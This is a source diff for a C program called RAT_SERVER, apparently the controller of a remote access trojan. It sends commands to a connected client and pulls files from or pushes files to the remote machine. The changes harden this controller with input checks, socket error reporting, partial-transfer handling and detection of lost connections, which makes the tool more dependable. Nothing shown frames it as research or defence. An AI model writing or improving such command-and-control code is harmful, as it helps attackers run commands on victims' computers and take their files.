@@ -5,6 +5,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <signal.h>
+#include <errno.h>
 
 #ifdef _WIN32
     #include <winsock2.h>
@@ -157,11 +158,30 @@ int accept_client(RAT_SERVER *server) {
 
 void send_command(RAT_SERVER *server, const char *command) {
     char command_with_newline[MAX_COMMAND_SIZE + 2];
+    
+    if (!server || !command) {
+        printf("Error: Invalid parameters passed to send_command\n");
+        return;
+    }
+    
+    if (strlen(command) > MAX_COMMAND_SIZE) {
+        printf("Error: Command too long (max %d characters)\n", MAX_COMMAND_SIZE);
+        return;
+    }
+    
     snprintf(command_with_newline, sizeof(command_with_newline), "%s\n", command);
     
     int bytes_sent = send(server->client_fd, command_with_newline, strlen(command_with_newline), 0);
     if (bytes_sent <= 0) {
-        printf("Error: Failed to send command to client\n");
+#ifdef _WIN32
+        printf("Error: Failed to send command to client (WSA Error: %d)\n", WSAGetLastError());
+#else
+        perror("Error: Failed to send command to client");
+#endif
+        // Connection might be broken
+        server->client_fd = INVALID_SOCKET;
+    } else if (bytes_sent != (int)strlen(command_with_newline)) {
+        printf("Warning: Partial command sent (%d of %zu bytes)\n", bytes_sent, strlen(command_with_newline));
     }
 }
 
@@ -172,15 +192,29 @@ void receive_response(RAT_SERVER *server) {
     int total_received = 0;
     int max_response_size = sizeof(full_response) - 1;
     
+    if (!server) {
+        printf("Error: Invalid server parameter in receive_response\n");
+        return;
+    }
+    
+    if (server->client_fd == INVALID_SOCKET) {
+        printf("Error: No active client connection\n");
+        return;
+    }
+    
     // Set socket to non-blocking temporarily to handle timeouts
 #ifdef _WIN32
     DWORD timeout = 1000; // 1 second timeout in milliseconds
-    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+    if (setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) != 0) {
+        printf("Warning: Failed to set socket timeout (WSA Error: %d)\n", WSAGetLastError());
+    }
 #else
     struct timeval timeout;
     timeout.tv_sec = 1;  // 1 second timeout
     timeout.tv_usec = 0;
-    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+    if (setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) != 0) {
+        perror("Warning: Failed to set socket timeout");
+    }
 #endif
     
     while (total_received < max_response_size) {
@@ -208,21 +242,45 @@ void receive_response(RAT_SERVER *server) {
             }
         } else if (bytes_received == 0) {
             printf("\nClient disconnected\n");
+            server->client_fd = INVALID_SOCKET;
             break;
         } else {
-            // Error or timeout - likely end of response
-            break;
+            // Error or timeout
+#ifdef _WIN32
+            int error = WSAGetLastError();
+            if (error == WSAETIMEDOUT) {
+                // Timeout is expected for end of response
+                break;
+            } else {
+                printf("Error receiving data from client (WSA Error: %d)\n", error);
+                server->client_fd = INVALID_SOCKET;
+                break;
+            }
+#else
+            if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                // Timeout is expected for end of response
+                break;
+            } else {
+                perror("Error receiving data from client");
+                server->client_fd = INVALID_SOCKET;
+                break;
+            }
+#endif
         }
     }
     
     // Reset socket to blocking mode
 #ifdef _WIN32
     timeout = 0;
-    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+    if (setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) != 0) {
+        printf("Warning: Failed to reset socket timeout (WSA Error: %d)\n", WSAGetLastError());
+    }
 #else
     timeout.tv_sec = 0;
     timeout.tv_usec = 0;
-    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+    if (setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) != 0) {
+        perror("Warning: Failed to reset socket timeout");
+    }
 #endif
     
     if (total_received > 0) {
@@ -236,6 +294,21 @@ void handle_download(RAT_SERVER *server, const char *remote_filename, const char
     char buffer[BUFFER_SIZE];
     int bytes_received;
     char filepath[512];
+    
+    if (!server || !remote_filename) {
+        printf("Error: Invalid parameters passed to handle_download\n");
+        return;
+    }
+    
+    if (server->client_fd == INVALID_SOCKET) {
+        printf("Error: No active client connection\n");
+        return;
+    }
+    
+    if (strlen(remote_filename) > 400) {
+        printf("Error: Remote filename too long\n");
+        return;
+    }
     
     // Determine local file path
     if (local_destination && strlen(local_destination) > 0) {
@@ -263,7 +336,8 @@ void handle_download(RAT_SERVER *server, const char *remote_filename, const char
 #endif
         } else {
             // Destination is a full file path
-            strcpy(filepath, local_destination);
+            strncpy(filepath, local_destination, sizeof(filepath) - 1);
+            filepath[sizeof(filepath) - 1] = '\0';
         }
     } else {
         // No destination specified, use current directory with base filename
@@ -291,7 +365,7 @@ void handle_download(RAT_SERVER *server, const char *remote_filename, const char
     
     file = fopen(filepath, "wb");
     if (!file) {
-        printf("Error: Cannot create file %s\n", filepath);
+        printf("Error: Cannot create file %s - %s\n", filepath, strerror(errno));
         return;
     }
     
@@ -302,13 +376,33 @@ void handle_download(RAT_SERVER *server, const char *remote_filename, const char
     printf("\n");
     
     while ((bytes_received = recv(server->client_fd, buffer, BUFFER_SIZE, 0)) > 0) {
-        fwrite(buffer, 1, bytes_received, file);
+        size_t bytes_written = fwrite(buffer, 1, bytes_received, file);
+        if (bytes_written != (size_t)bytes_received) {
+            printf("Error: Failed to write data to file (wrote %zu of %d bytes)\n", bytes_written, bytes_received);
+            fclose(file);
+            unlink(filepath); // Remove partially written file
+            return;
+        }
         if (bytes_received < BUFFER_SIZE) {
             break; // End of file
         }
     }
     
-    fclose(file);
+    if (bytes_received < 0) {
+#ifdef _WIN32
+        printf("Error: Failed to receive file data (WSA Error: %d)\n", WSAGetLastError());
+#else
+        perror("Error: Failed to receive file data");
+#endif
+        fclose(file);
+        unlink(filepath); // Remove partially written file
+        return;
+    }
+    
+    if (fclose(file) != 0) {
+        printf("Warning: Error closing file %s - %s\n", filepath, strerror(errno));
+    }
+    
     printf("File downloaded successfully as: %s\n", filepath);
 }
 
@@ -318,9 +412,24 @@ void handle_upload(RAT_SERVER *server, const char *filename, const char *destina
     size_t bytes_read;
     char upload_info[512];
     
+    if (!server || !filename) {
+        printf("Error: Invalid parameters passed to handle_upload\n");
+        return;
+    }
+    
+    if (server->client_fd == INVALID_SOCKET) {
+        printf("Error: No active client connection\n");
+        return;
+    }
+    
+    if (strlen(filename) > 400) {
+        printf("Error: Filename too long\n");
+        return;
+    }
+    
     file = fopen(filename, "rb");
     if (!file) {
-        printf("Error: Cannot open file %s\n", filename);
+        printf("Error: Cannot open file %s - %s\n", filename, strerror(errno));
         return;
     }
     
@@ -351,18 +460,54 @@ void handle_upload(RAT_SERVER *server, const char *filename, const char *destina
         snprintf(upload_info, sizeof(upload_info), "|%s\n", base_filename);
     }
     
-    send(server->client_fd, upload_info, strlen(upload_info), 0);
+    int bytes_sent = send(server->client_fd, upload_info, strlen(upload_info), 0);
+    if (bytes_sent <= 0) {
+#ifdef _WIN32
+        printf("Error: Failed to send upload info (WSA Error: %d)\n", WSAGetLastError());
+#else
+        perror("Error: Failed to send upload info");
+#endif
+        fclose(file);
+        return;
+    }
     
     // Wait for acknowledgment from client before sending file content
     char ack[10];
-    recv(server->client_fd, ack, sizeof(ack), 0);
+    int ack_received = recv(server->client_fd, ack, sizeof(ack), 0);
+    if (ack_received <= 0) {
+#ifdef _WIN32
+        printf("Error: Failed to receive acknowledgment from client (WSA Error: %d)\n", WSAGetLastError());
+#else
+        perror("Error: Failed to receive acknowledgment from client");
+#endif
+        fclose(file);
+        return;
+    }
     
     // Send file content
     while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
-        send(server->client_fd, buffer, bytes_read, 0);
+        bytes_sent = send(server->client_fd, buffer, bytes_read, 0);
+        if (bytes_sent <= 0) {
+#ifdef _WIN32
+            printf("Error: Failed to send file data (WSA Error: %d)\n", WSAGetLastError());
+#else
+            perror("Error: Failed to send file data");
+#endif
+            fclose(file);
+            return;
+        } else if (bytes_sent != (int)bytes_read) {
+            printf("Warning: Partial file data sent (%d of %zu bytes)\n", bytes_sent, bytes_read);
+        }
     }
     
-    fclose(file);
+    if (ferror(file)) {
+        printf("Error: Failed to read file %s\n", filename);
+    }
+    
+    if (fclose(file) != 0) {
+        printf("Warning: Error closing file %s - %s\n", filename, strerror(errno));
+    }
+    
     printf("File uploaded successfully\n");
 }
 
@@ -372,6 +517,16 @@ void execute_commands(RAT_SERVER *server) {
     char *token;
     int arg_count;
     
+    if (!server) {
+        printf("Error: Invalid server parameter in execute_commands\n");
+        return;
+    }
+    
+    if (server->client_fd == INVALID_SOCKET) {
+        printf("Error: No active client connection\n");
+        return;
+    }
+    
     print_banner();
     
     // Wait for initial prompt from client
@@ -380,10 +535,21 @@ void execute_commands(RAT_SERVER *server) {
     printf("\n");
     
     while (1) {
+        // Check if connection is still valid
+        if (server->client_fd == INVALID_SOCKET) {
+            printf("Connection lost. Exiting command loop.\n");
+            break;
+        }
+        
         printf(">> ");
         fflush(stdout);
         
         if (!fgets(command, sizeof(command), stdin)) {
+            if (feof(stdin)) {
+                printf("\nEnd of input. Exiting...\n");
+            } else {
+                perror("Error reading command input");
+            }
             break;
         }
         
@@ -416,14 +582,19 @@ void execute_commands(RAT_SERVER *server) {
                 continue;
             }
             send_command(server, command);
-            if (arg_count >= 3) {
-                handle_download(server, args[1], args[2]);  // With destination
-            } else {
-                handle_download(server, args[1], NULL);     // Default location
+            // Check if connection is still active after sending command
+            if (server->client_fd != INVALID_SOCKET) {
+                if (arg_count >= 3) {
+                    handle_download(server, args[1], args[2]);  // With destination
+                } else {
+                    handle_download(server, args[1], NULL);     // Default location
+                }
+                // Wait for confirmation from client
+                if (server->client_fd != INVALID_SOCKET) {
+                    receive_response(server);
+                    printf("\n");
+                }
             }
-            // Wait for confirmation from client
-            receive_response(server);
-            printf("\n");
         }
         else if (strcmp(args[0], "upload") == 0) {
             if (arg_count < 2) {
@@ -433,14 +604,19 @@ void execute_commands(RAT_SERVER *server) {
                 continue;
             }
             send_command(server, "upload");
-            if (arg_count >= 3) {
-                handle_upload(server, args[1], args[2]);  // With destination
-            } else {
-                handle_upload(server, args[1], NULL);     // Default location
+            // Check if connection is still active after sending command
+            if (server->client_fd != INVALID_SOCKET) {
+                if (arg_count >= 3) {
+                    handle_upload(server, args[1], args[2]);  // With destination
+                } else {
+                    handle_upload(server, args[1], NULL);     // Default location
+                }
+                // Wait for confirmation from client
+                if (server->client_fd != INVALID_SOCKET) {
+                    receive_response(server);
+                    printf("\n");
+                }
             }
-            // Wait for confirmation from client
-            receive_response(server);
-            printf("\n");
         }
         else if (strcmp(args[0], "exit") == 0) {
             send_command(server, "exit");
@@ -450,8 +626,10 @@ void execute_commands(RAT_SERVER *server) {
         else {
             // Send command to client and receive response with prompt
             send_command(server, command);
-            receive_response(server);
-            printf("\n");
+            if (server->client_fd != INVALID_SOCKET) {
+                receive_response(server);
+                printf("\n");
+            }
         }
     }
 }
